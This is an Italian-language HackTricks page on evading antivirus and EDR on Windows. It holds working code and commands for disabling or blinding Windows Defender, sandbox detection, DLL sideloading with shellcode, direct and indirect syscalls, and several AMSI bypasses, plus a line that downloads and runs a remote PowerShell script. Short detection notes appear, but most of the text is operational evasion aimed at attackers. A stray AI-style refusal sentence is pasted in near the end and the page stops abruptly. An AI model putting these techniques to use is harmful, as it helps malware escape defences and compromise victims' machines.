# Bypass dell'antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta inizialmente da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Bloccare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per impedire a Windows Defender di funzionare.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per impedire a Windows Defender di funzionare fingendo di essere un altro antivirus.
- [Disabilitare Defender se si è amministratori](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per cheat di videogiochi vengono spesso distribuiti come installer Node.js/Nexe non firmati, che prima **chiedono all'utente di ottenere privilegi elevati** e solo dopo neutralizzano Defender. Il flusso è semplice:

1. Verificare la presenza di un contesto amministrativo con `net session`. Il comando riesce solo se il chiamante dispone dei privilegi di amministratore, quindi un errore indica che il loader è in esecuzione come utente standard.
2. Riavviare immediatamente il loader con il verbo `RunAs` per attivare la richiesta di consenso UAC prevista, mantenendo la riga di comando originale.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Le vittime credono già di installare software «crackato», quindi in genere accettano la richiesta, concedendo al malware i diritti necessari per modificare i criteri di Defender.<sup>[[26]](#references)</sup>

### Esclusioni `MpPreference` indiscriminate per ogni lettera di unità

Una volta ottenuti i privilegi elevati, le catene in stile GachiLoader massimizzano i punti ciechi di Defender invece di disattivare direttamente il servizio. Il loader prima termina il watchdog dell’interfaccia grafica (`taskkill /F /IM SecHealthUI.exe`) e poi imposta **esclusioni estremamente ampie**, rendendo impossibile la scansione di ogni profilo utente, directory di sistema e disco rimovibile:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Il loop attraversa ogni filesystem montato (D:\, E:\, chiavette USB, ecc.), quindi **qualsiasi payload aggiunto in futuro in qualunque punto del disco viene ignorato**.
- L’esclusione dell’estensione `.sys` è lungimirante: gli attaccanti si riservano la possibilità di caricare driver non firmati in seguito, senza dover intervenire di nuovo su Defender.
- Tutte le modifiche vengono applicate in `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, consentendo alle fasi successive di verificare che le esclusioni persistano o di ampliarle senza riattivare UAC.

Poiché nessun servizio di Defender viene arrestato, i controlli di integrità più semplici continuano a segnalare che “l’antivirus è attivo”, anche se l’ispezione in tempo reale non esamina mai quei percorsi.<sup>[[26]](#references)</sup>

## **Metodologia di AV Evasion**

Attualmente, gli antivirus usano metodi diversi per verificare se un file è dannoso: rilevamento statico, analisi dinamica e, per gli EDR più avanzati, analisi comportamentale.

### **Rilevamento statico**

Il rilevamento statico si ottiene segnalando stringhe note come dannose o sequenze di byte presenti in un binario o in uno script, ed estraendo anche informazioni dal file stesso (ad es. descrizione del file, nome dell’azienda, firme digitali, icona, checksum, ecc.). Ciò significa che l’uso di strumenti pubblici noti può farti individuare più facilmente, perché probabilmente sono già stati analizzati e segnalati come dannosi. Esistono alcuni modi per aggirare questo tipo di rilevamento:

- **Crittografia**

Se cifri il binario, l’antivirus non potrà rilevare il tuo programma, ma ti servirà un loader di qualche tipo per decifrarlo ed eseguirlo in memoria.

- **Offuscamento**

A volte basta modificare alcune stringhe nel binario o nello script per superare il rilevamento dell’antivirus, ma questa operazione può richiedere molto tempo, a seconda di ciò che vuoi offuscare.

- **Strumenti personalizzati**

Se sviluppi strumenti personalizzati, non esisteranno firme dannose note, ma ci vorranno molto tempo e impegno.

> [!TIP]
> Un buon modo per verificare il rilevamento statico di Windows Defender è usare [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Suddivide il file in più segmenti e chiede a Defender di analizzarli singolarmente, così può indicarti esattamente quali stringhe o byte nel binario vengono segnalati.

Ti consiglio vivamente di dare un’occhiata a questa [playlist di YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sull’AV Evasion pratica.

### Test offline delle caratteristiche PE per classificatori statici

I byte di payload compressi o cifrati sono solo uno degli input di un classificatore statico. EMBER2024 estrae caratteristiche PE, tra cui importazioni, esportazioni, sezioni, header e dati Authenticode.<sup>[[48]](#references)</sup> In un esperimento con un loader, l’aggiunta di 141 importazioni dall’aspetto benigno ha ridotto del 93% il punteggio di malignità di EMBER2024, mentre le importazioni associate al malware lo hanno aumentato. Questo risultato vale per quel modello e quei campioni, e non costituisce un bypass affidabile di un prodotto AV/EDR specifico.<sup>[[50]](#references)</sup>

Per un test autorizzato di un loader, mantieni costanti il payload e il percorso di esecuzione, modifica una sola variabile di build prevista per ogni variante e confronta i punteggi offline. Esamina le caratteristiche PE risultanti, perché una modifica della build può influire su più gruppi di caratteristiche.<sup>[[49]](#references)[[50]](#references)</sup> Per mantenere nell’IAT le importazioni desiderate, richiama le API Win32 scelte da codice raggiungibile. Varia la selezione e distribuisci i punti di chiamata tra le build, invece di creare una funzione di camuffamento fissa che potrebbe diventare una firma. L’esperimento ha inoltre rilevato punteggi più bassi con la firma del codice valida, voci di esportazione e un numero maggiore di funzioni che ampliano `.pdata`; la firma non valida ha avuto scarso effetto, così come l’effetto di `.pdata` è stato contenuto.<sup>[[50]](#references)</sup>

Il pacchetto `thrember` fornisce l’estrazione delle caratteristiche e modelli di benchmark. Dopo averlo installato, usa `thrember.download_models("models")` con una directory `models` già esistente, poi esegui il valutatore dalla directory superiore: la funzione di download modifica la directory di lavoro corrente. Il classificatore PE può valutare una directory di build senza inviarle a un servizio di scansione:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Mantieni fissi il modello e le versioni del feature extractor durante il confronto. Un punteggio offline più basso mostra solo come questo classificatore reagisce al binario modificato; non dimostra l'evasione dell'analisi comportamentale, dell'emulazione o di un modello diverso del vendor.<sup>[[49]](#references)[[50]](#references)</sup> Per [il polimorfismo per build e il camuffamento del binario esterno nei payload virtualizzati](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), consulta il modello di esecuzione separato.

### **Analisi dinamica**

L'analisi dinamica si verifica quando l'AV esegue il tuo binario in una sandbox e osserva eventuali attività malevole (ad es. tentare di decrittare e leggere le password del browser, eseguire un minidump di LSASS, ecc.). Questa parte può essere un po' più complicata da gestire, ma ecco alcune cose che puoi fare per eludere le sandbox.

- **Attendere prima dell'esecuzione** A seconda di come viene implementata, può essere un ottimo modo per aggirare l'analisi dinamica dell'AV. Gli AV hanno pochissimo tempo per analizzare i file senza interrompere il flusso di lavoro dell'utente, quindi usare attese lunghe può ostacolare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare l'attesa, a seconda di come viene implementata.
- **Controllare le risorse della macchina** Di solito le sandbox hanno a disposizione risorse limitate (ad es. < 2GB di RAM), altrimenti potrebbero rallentare la macchina dell'utente. Puoi anche essere molto creativo, ad esempio controllando la temperatura della CPU o persino la velocità delle ventole: non tutto sarà implementato nella sandbox.
- **Controlli specifici della macchina** Se vuoi prendere di mira un utente la cui workstation è unita al dominio "contoso.local", puoi controllare il dominio del computer per verificare che corrisponda a quello specificato; se non corrisponde, puoi far terminare il programma.

A quanto pare, il nome del computer della sandbox di Microsoft Defender è HAL9TH, quindi puoi controllare il nome del computer nel tuo malware prima della detonazione: se il nome corrisponde a HAL9TH, significa che ti trovi nella sandbox di Defender e puoi far terminare il programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli di [@mgeeky](https://twitter.com/mariuszbit) per contrastare le sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come abbiamo già detto in questo post, gli **strumenti pubblici** alla fine **verranno rilevati**, quindi dovresti chiederti una cosa:

Ad esempio, se vuoi effettuare il dump di LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un progetto diverso, meno conosciuto, che effettua anch'esso il dump di LSASS?

La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei malware più segnalati dagli AV e dagli EDR, se non il più segnalato. Sebbene il progetto in sé sia molto valido, è anche un incubo da usare per aggirare gli AV, quindi cerca semplicemente delle alternative per raggiungere il tuo obiettivo.

> [!TIP]
> Quando modifichi i tuoi payload per eludere i sistemi di rilevamento, assicurati di **disattivare l'invio automatico dei campioni** in Defender e, per favore, sul serio, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è riuscire a eludere i sistemi di rilevamento nel lungo periodo. Se vuoi verificare se un particolare AV rileva il tuo payload, installalo su una VM, prova a disattivare l'invio automatico dei campioni e testalo lì finché non sei soddisfatto del risultato.

## EXE vs DLL

Quando possibile, **dai sempre la priorità all'uso delle DLL per l'evasione**; secondo la mia esperienza, i file DLL vengono solitamente rilevati e analizzati **molto meno**, quindi in alcuni casi è un trucco molto semplice per evitare il rilevamento (se il tuo payload può essere eseguito come DLL, ovviamente).

Come possiamo vedere in questa immagine, un payload DLL di Havoc ha un tasso di rilevamento di 4/26 su antiscan.me, mentre il payload EXE ha un tasso di rilevamento di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me tra un normale payload EXE di Havoc e una normale DLL di Havoc</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto più furtivo.

## DLL Sideloading e Proxying

Il **DLL Sideloading** sfrutta l'ordine di ricerca delle DLL usato dal loader, posizionando l'applicazione vittima e i payload malevoli uno accanto all'altro.

Puoi cercare i programmi vulnerabili al DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e il seguente script PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Questo comando restituirà l'elenco dei programmi vulnerabili al DLL hijacking in "C:\Program Files\\" e dei file DLL che tentano di caricare.

Ti consiglio vivamente di **esplorare personalmente i programmi vulnerabili al DLL hijacking/sideloading**: se eseguita correttamente, questa tecnica è piuttosto stealth, ma se usi programmi pubblicamente noti come vulnerabili al DLL sideloading, potresti farti individuare facilmente.

Il semplice posizionamento di una DLL malevola con il nome di una DLL che un programma si aspetta di caricare non farà caricare il tuo payload, perché il programma si aspetta che quella DLL contenga funzioni specifiche. Per risolvere questo problema, useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

Il **DLL Proxying** inoltra le chiamate che un programma effettua dalla DLL proxy (e malevola) alla DLL originale, preservando così le funzionalità del programma e consentendo l'esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/).

Questi sono i passaggi che ho seguito:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

L'ultimo comando ci fornirà 2 file: un template del codice sorgente DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento di 0/26 su [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Consiglio vivamente** di guardare il [VOD su Twitch di S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sul DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire gli argomenti che abbiamo trattato.

### Abuso degli export inoltrati (ForwardSideLoading)

I moduli PE di Windows possono esportare funzioni che in realtà sono "forwarder": invece di puntare al codice, la voce di esportazione contiene una stringa ASCII nel formato `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il loader di Windows:

- Carica `TargetDll` se non è già stato caricato
- Risolve `TargetFunc` al suo interno

Comportamenti importanti da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornita dallo spazio dei nomi KnownDLLs protetto (ad es. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` non è una KnownDLL, viene utilizzato il normale ordine di ricerca delle DLL, che include la directory del modulo che sta eseguendo la risoluzione del forward.

Questo consente una primitiva di sideloading indiretta: trova una DLL firmata che esporta una funzione inoltrata a un modulo il cui nome non è una KnownDLL, quindi colloca la DLL firmata accanto a una DLL controllata dall'attaccante, con lo stesso nome esatto del modulo di destinazione inoltrato. Quando viene invocato l'export inoltrato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo il tuo DllMain.<sup>[[13]](#references)</sup>

Esempio osservato su Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta tramite il normale ordine di ricerca.

PoC (copia-incolla):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Inserisci una `NCRYPTPROV.dll` malevola nella stessa cartella. È sufficiente un DllMain minimale per eseguire codice; non è necessario implementare la funzione inoltrata per attivare DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Attiva il forward con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportamento osservato:
- rundll32 (firmato) carica la `keyiso.dll` side-by-side (firmata)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader carica quindi `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, si riceve un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la ricerca:
- Concentrati sugli export inoltrati il cui modulo di destinazione non è una KnownDLL. Le KnownDLL sono elencate in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare gli export inoltrati con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l’inventario dei forwarder di Windows 11 per cercare potenziali candidati: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idee per il rilevamento e la difesa:
- Monitora i LOLBins (ad es. rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguite dal caricamento di DLL non-KnownDLLs con lo stesso nome di base da quella directory
- Genera avvisi per catene di processi/moduli come: `rundll32.exe` → `keyiso.dll` non di sistema → `NCRYPTPROV.dll` in percorsi scrivibili dall’utente
- Applica policy di integrità del codice (WDAC/AppLocker) e impedisci la scrittura e l’esecuzione nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze è un toolkit per payload che consente di aggirare gli EDR usando processi sospesi, syscalls dirette e metodi di esecuzione alternativi`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L’evasion è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non affidarti mai a un solo strumento; se possibile, prova a concatenare più tecniche di evasion.

## Direct/Indirect Syscalls e risoluzione SSN (SysWhispers4)

Gli EDR spesso applicano **user-mode inline hooks** agli stub syscall di `ntdll.dll`. Per aggirare questi hook, puoi generare stub syscall **direct** o **indirect** che caricano l’**SSN** (System Service Number) corretto ed effettuano la transizione alla modalità kernel senza eseguire l’entrypoint esportato sottoposto a hook.<sup>[[32]](#references)</sup>

**Opzioni di invocazione:**
- **Direct (embedded)**: inserisce un’istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (senza accedere a un export di `ntdll`).
- **Indirect**: salta a un gadget `syscall` esistente all’interno di `ntdll`, facendo apparire la transizione al kernel come originata da `ntdll` (utile per l’evasion euristica); **randomized indirect** sceglie un gadget da un pool a ogni chiamata.
- **Egg-hunt**: evita di incorporare su disco la sequenza statica di opcode `0F 05`; risolve una sequenza syscall a runtime.

**Strategie di risoluzione SSN resistenti agli hook:**
- **FreshyCalls (VA sort)**: deduce gli SSN ordinando gli stub syscall per indirizzo virtuale invece di leggere i byte degli stub.
- **SyscallsFromDisk**: mappa una `\KnownDlls\ntdll.dll` pulita, legge gli SSN dal suo `.text`, quindi la rimuove dalla mappatura (aggira tutti gli hook in memoria).
- **RecycledGate**: combina la deduzione degli SSN tramite ordinamento VA con la convalida degli opcode quando uno stub è pulito; se è sottoposto a hook, ripiega sulla deduzione tramite VA.
- **HW Breakpoint**: imposta DR0 sull’istruzione `syscall` e usa una VEH per acquisire l’SSN da `EAX` a runtime, senza analizzare byte sottoposti a hook.

Esempio d’uso di SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Quando analizzi gli export syscall di `ntdll` x64 puliti per individuare un SSN, accetta sia `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) sia la stessa sequenza preceduta da `F3 0F 1E FA` (`endbr64`). Quest’ultima è uno stub con prefisso CET: un parser che presume che l’SSN si trovi sempre a un offset fisso non lo rileverà. Se l’inizializzazione delle indirect syscall fallisce e il loader ricorre a `GetProcAddress`, le chiamate tramite questi export potrebbero incontrare nuovamente hook in user mode.<sup>[[54]](#references)</sup>

### Export syscall alternativi in `tprtdll.dll`

Il progetto segnala `tprtdll.dll` come una DLL firmata da Microsoft presente in `C:\Windows\System32\` su Windows 11 build 26100 e successive. Ha indirizzi di codice distinti da `ntdll.dll`, quindi un hook che modifica solo un entrypoint syscall di `ntdll` non modifica lo stub corrispondente di `tprtdll`. A differenza dei metodi di risoluzione dell’SSN descritti sopra, questo approccio carica `tprtdll.dll` e chiama direttamente un export `Nt*` o `Zw*` disponibile tramite `GetProcAddress`. Verifica che la DLL e gli export richiesti esistano e usa i prototipi NT appropriati.<sup>[[55]](#references)</sup>

La PoC di self-injection usa `tprtdll!NtAllocateVirtualMemoryEx` per allocare memoria RW, copia i byte con `memcpy`, imposta la regione come RX con `tprtdll!ZwProtectVirtualMemory` e avvia un thread con `tprtdll!RtlCreateUserThread`.<sup>[[56]](#references)</sup> La variante cross-process richiede un handle accessibile al processo target e usa `WriteProcessMemory` per la copia.<sup>[[57]](#references)</sup> L’inventario degli export del progetto non include `NtOpenProcess`, `NtWriteVirtualMemory` e `NtCreateThreadEx`, quindi non tutte le operazioni di injection possono usare un export alternativo.<sup>[[55]](#references)</sup>

La PoC non dimostra che `RtlCreateUserThread` sia uno stub direct syscall né che le sue chiamate interne evitino gli hook di `ntdll` solo perché l’export è stato risolto da `tprtdll`.<sup>[[56]](#references)</sup> Inoltre, l’esempio cross-process include gli indirizzi di `WinExec` e `ExitThread` risolti nel processo injector; perché il payload dell’esempio funzioni, questi indirizzi devono essere validi nel processo target.<sup>[[57]](#references)</sup>

Questo metodo aggira solo gli hook limitati agli export corrispondenti di `ntdll`; non nasconde le syscall al monitoraggio a livello kernel.<sup>[[55]](#references)</sup> Per un metodo di injection che evita invece le scritture remote e la creazione di nuovi thread, vedi [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire il "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli antivirus erano in grado di analizzare solo i **file su disco**, quindi, se riuscivi in qualche modo a eseguire i payload **direttamente in memoria**, l’antivirus non poteva fare nulla per impedirlo, perché non aveva visibilità sufficiente.

La funzionalità AMSI è integrata nei seguenti componenti di Windows.

- Controllo dell’account utente, o UAC (elevazione di EXE, COM, MSI o installazioni ActiveX)
- PowerShell (script, uso interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macro VBA di Office

Consente alle soluzioni antivirus di esaminare il comportamento degli script esponendone i contenuti in una forma non cifrata e non offuscata.

L’esecuzione di `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` genera il seguente avviso in Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota che antepone `amsi:` e poi il percorso dell’eseguibile da cui è stato eseguito lo script, in questo caso powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo stati comunque rilevati in memoria a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene analizzato da AMSI. Questo riguarda anche `Assembly.Load(byte[])` per caricare codice da eseguire in memoria. Ecco perché, per l’esecuzione in memoria, si consiglia di usare versioni precedenti di .NET (come la 4.7.2 o precedenti) se si vuole eludere AMSI.

Esistono un paio di modi per aggirare AMSI:

- **Offuscamento**

Poiché AMSI si basa principalmente sui rilevamenti statici, modificare gli script che si tenta di caricare può essere un buon modo per eludere il rilevamento.

Tuttavia, AMSI è in grado di deoffuscare gli script anche quando hanno più livelli di offuscamento, quindi l’offuscamento potrebbe essere una cattiva scelta, a seconda di come viene applicato. Questo rende l’elusione tutt’altro che immediata. A volte, però, basta cambiare un paio di nomi di variabili per risolvere il problema: dipende da quanto un elemento è stato segnalato.

- **Bypass di AMSI**

Poiché AMSI viene implementato caricando una DLL nel processo di powershell (oltre che in cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente anche con un utente senza privilegi. A causa di questo difetto nell’implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere l’analisi di AMSI.

**Forzare un errore**

Forzare il fallimento dell’inizializzazione di AMSI (amsiInitFailed) fa sì che il processo corrente non avvii alcuna scansione. La falla è stata divulgata inizialmente da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per impedirne un uso più ampio.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

È bastata una riga di codice PowerShell per rendere AMSI inutilizzabile nel processo PowerShell corrente. Naturalmente, questa riga è stata rilevata da AMSI stesso, quindi è necessario modificarla per poter usare questa tecnica.

Ecco un bypass di AMSI modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, questo probabilmente verrà segnalato non appena il post sarà pubblicato, quindi non dovresti pubblicare codice se il tuo obiettivo è rimanere inosservato.

**Memory Patching**

Questa tecnica è stata scoperta inizialmente da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l’indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell’input fornito dall’utente) e sovrascriverla con istruzioni che restituiscono il codice E_INVALIDARG. In questo modo, il risultato della scansione effettiva sarà 0, che viene interpretato come un risultato pulito.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Esistono anche molte altre tecniche usate per bypassare AMSI con powershell; dai un’occhiata a [**questa pagina**](basic-powershell-for-pentesters/index.html#amsi-bypass) e a [**questo repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più.

### Reindirizzamento del puntatore di scansione AMSI COM invece del patching di `AmsiScanBuffer`

Un altro bypass limitato al processo lascia intatto l’entry point di `AmsiScanBuffer`. Nel loader .NET a 64 bit descritto, viene creato un oggetto COM AMSI dal CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` restituisce il puntatore all’interfaccia e lo slot della vtable all’offset `0x18` viene usato come destinazione della chiamata di scansione. Il loader modifica un puntatore nativo di `Console.Clear()` con un piccolo stub x64, cambia quella voce della vtable affinché punti allo stub usando `VirtualProtect()`, quindi ripristina le protezioni originali della pagina. La larghezza del puntatore a 64 bit e il layout COM previsto sono prerequisiti; questo non è un offset generico valido per interfacce AMSI o build arbitrarie. Le fasi precedenti osservate sono il [caricamento di un sidecar firmato AppDomainManager](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) e la [deserializzazione RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

I byte dello stub osservato sono `41 C7 00 01 00 00 00 33 C0 C3`: scrivono **1** nel puntatore del risultato in `r8` e restituiscono **0** in `eax`. Pertanto, l’affermazione riportata secondo cui il risultato della scansione è `AMSI_RESULT_CLEAN` (0) confonde il valore restituito `S_OK` con l’enumerazione dell’output. Nell’ordine documentato di `AMSI_RESULT`, il risultato **1** è `AMSI_RESULT_NOT_DETECTED`; è comunque inferiore alla soglia di rilevamento.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Blocco di AMSI impedendo il caricamento di amsi.dll (hook LdrLoadDll)

AMSI viene inizializzato solo dopo il caricamento di `amsi.dll` nel processo corrente. Un bypass robusto e indipendente dal linguaggio consiste nell’applicare un hook user-mode a `ntdll!LdrLoadDll` che restituisca un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e il processo non esegue scansioni.<sup>[[23]](#references)</sup>

Schema di implementazione (pseudocodice x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Non posso tradurre istruzioni operative per aggirare AMSI o eludere il rilevamento AV/EDR. Posso aiutarti a tradurre una sintesi orientata alla difesa o alla mitigazione.

```bash
powershell.exe -version 2
```

## Logging di PowerShell

